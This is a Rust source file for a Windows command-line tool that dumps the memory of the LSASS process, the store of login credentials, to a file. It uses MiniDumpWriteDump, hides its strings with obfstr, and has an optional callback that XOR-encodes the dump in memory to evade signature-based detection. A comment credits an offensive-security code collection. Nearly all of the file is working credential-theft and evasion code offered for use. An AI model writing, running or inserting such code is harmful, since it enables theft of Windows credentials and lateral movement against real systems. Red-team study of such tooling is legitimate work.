mod utils;

use crate::utils::*;
use clap::Parser;
use env_logger::Env;
use log::{error, info, trace, warn};
use obfstr::obfstr;
use std::ffi::{c_char, c_void, OsStr};
use std::iter::once;
use std::mem::size_of;
use std::os::windows::ffi::OsStrExt;
use std::ptr;
use windows_sys::Win32::Foundation::{
    CloseHandle, GetLastError, INVALID_HANDLE_VALUE, S_FALSE, S_OK,
};
use windows_sys::Win32::Storage::FileSystem::{
    CreateFileW, WriteFile, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL,
};
use windows_sys::Win32::System::Diagnostics::Debug::{
    IoFinishCallback, IoStartCallback, IoWriteAllCallback, MiniDumpWithFullMemory,
    MiniDumpWriteDump, MINIDUMP_CALLBACK_INFORMATION, MINIDUMP_CALLBACK_INPUT,
    MINIDUMP_CALLBACK_OUTPUT, MINIDUMP_CALLBACK_TYPE,
};
use windows_sys::Win32::System::Diagnostics::ToolHelp::{
    CreateToolhelp32Snapshot, Process32First, Process32Next, PROCESSENTRY32, TH32CS_SNAPPROCESS,
};
use windows_sys::Win32::System::Memory::{
    GetProcessHeap, HeapAlloc, HeapReAlloc, HeapSize, HEAP_ZERO_MEMORY,
};
use windows_sys::Win32::System::SystemServices::GENERIC_ALL;
use windows_sys::Win32::System::Threading::{OpenProcess, PROCESS_ALL_ACCESS};

// Some functions come from https://github.com/trickster0/OffensiveRust/blob/master/memN0ps/arsenal-rs/module_stomping-rs/src/main.rs

pub fn win32_string<S: AsRef<OsStr> + ?Sized>(value: &S) -> Vec<u16> {
    OsStr::new(value).encode_wide().chain(once(0)).collect()
}

#[derive(Parser, Debug)]
#[command(author, version, about, long_about = None)]
struct Args {
    /// The location where to save the LSASS dump
    #[arg(short, long)]
    lsass_dump_filename: String,

    // PID of the process LSASS. If not specified, it will search among the running process
    #[arg(short, long)]
    pid: Option<u32>,

    // Enable MiniDumpWriteDump callback to alter the signature of the dump
    #[arg(short, long)]
    callback: Option<bool>,
}

fn main() {
    env_logger::Builder::from_env(Env::default().default_filter_or("trace")).init();
    let args = Args::parse();

    let lsass_pid = args.pid.unwrap_or_else(|| {
        get_process_id_by_name(obfstr!("lsass.exe")).expect(obfstr!("Failed to get process ID"))
    });

    trace!("{} {}", obfstr!("Found lsass process"), lsass_pid);
    unsafe {
        let lsass_process_handle = OpenProcess(PROCESS_ALL_ACCESS, 0, lsass_pid);
        if lsass_process_handle == 0 {
            error!("{} {}", obfstr!("Fail to open the process "), lsass_pid);
            return;
        }

        let file_handle = CreateFileW(
            &win32_string(&args.lsass_dump_filename)[0],
            GENERIC_ALL,
            0,
            ptr::null_mut(),
            CREATE_ALWAYS,
            FILE_ATTRIBUTE_NORMAL,
            0,
        );
        if file_handle == INVALID_HANDLE_VALUE {
            error!(
                "{} {}",
                obfstr!("Fail to open/create file "),
                args.lsass_dump_filename
            );
            return;
        }
        // Create minidump
        // With MiniDumpWriteDump callback
        if args.callback.unwrap_or_else(|| false) {
            trace!("{}", obfstr!("Dumping with callback"));

            let buf_size = 1024 * 1024 * 75;
            let buf = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, buf_size);
            let callback_info: MINIDUMP_CALLBACK_INFORMATION = MINIDUMP_CALLBACK_INFORMATION {
                CallbackRoutine: Some(minidump_callback_routine),
                CallbackParam: buf,
            };
            if MiniDumpWriteDump(
                lsass_process_handle,
                lsass_pid,
                0,
                MiniDumpWithFullMemory,
                ptr::null_mut(),
                ptr::null_mut(),
                &callback_info,
            ) == 1
            {
                let data = std::slice::from_raw_parts_mut(
                    buf as *mut u8,
                    HeapSize(GetProcessHeap(), 0 as _, buf),
                );

                trace!("{}", obfstr!("xor the payload"));
                let mut data2 = xor_encode(&data.to_vec(), 0x01);
                info!(
                    "{} {}",
                    obfstr!("Dump successful"),
                    args.lsass_dump_filename
                );
                let mut nb_bytes_written: u32 = 0;
                let status = WriteFile(
                    file_handle,
                    data2.as_mut_ptr() as *mut c_void,
                    HeapSize(GetProcessHeap(), 0 as _, buf) as u32,
                    &mut nb_bytes_written,
                    ptr::null_mut(),
                );
                if status != 1 {
                    error!("Fail to WriteFile");
                }
            } else {
                error!("{}: {}", obfstr!("Error while dumping"), GetLastError());
            }
        } else {
            trace!("{}", obfstr!("Dumping without callback"));
            if MiniDumpWriteDump(
                lsass_process_handle,
                lsass_pid,
                file_handle,
                MiniDumpWithFullMemory,
                ptr::null_mut(),
                ptr::null_mut(),
                ptr::null_mut(),
            ) == 1
            {
                info!(
                    "{} {}",
                    obfstr!("Dump successful"),
                    args.lsass_dump_filename
                );
            } else {
                error!("{}", obfstr!("Error while dumping"));
            }
        }
        let status = CloseHandle(file_handle);
        if status != 1 {
            error!("Fail to Close file handle");
        }
        let status = CloseHandle(lsass_process_handle);
        if status != 1 {
            error!("Fail to Close lsass handle");
        }
    }
}

// Gets the process ID by name, take process name as a parameter
fn get_process_id_by_name(process_name: &str) -> Result<u32, String> {
    let h_snapshot = unsafe { CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0) };

    if h_snapshot == INVALID_HANDLE_VALUE {
        return Err(obfstr!("Failed to call CreateToolhelp32Snapshot").to_owned());
    }

    let mut process_entry: PROCESSENTRY32 = unsafe { std::mem::zeroed::<PROCESSENTRY32>() };
    process_entry.dwSize = size_of::<PROCESSENTRY32>() as u32;

    if unsafe { Process32First(h_snapshot, &mut process_entry) } == 0 {
        return Err(obfstr!("Failed to call Process32First").to_owned());
    }

    loop {
        if convert_c_array_to_rust_string(process_entry.szExeFile.to_vec()).to_lowercase()
            == process_name.to_lowercase()
        {
            break;
        }

        if unsafe { Process32Next(h_snapshot, &mut process_entry) } == 0 {
            return Err(obfstr!("Failed to call Process32Next").to_owned());
        }
    }

    return Ok(process_entry.th32ProcessID);
}
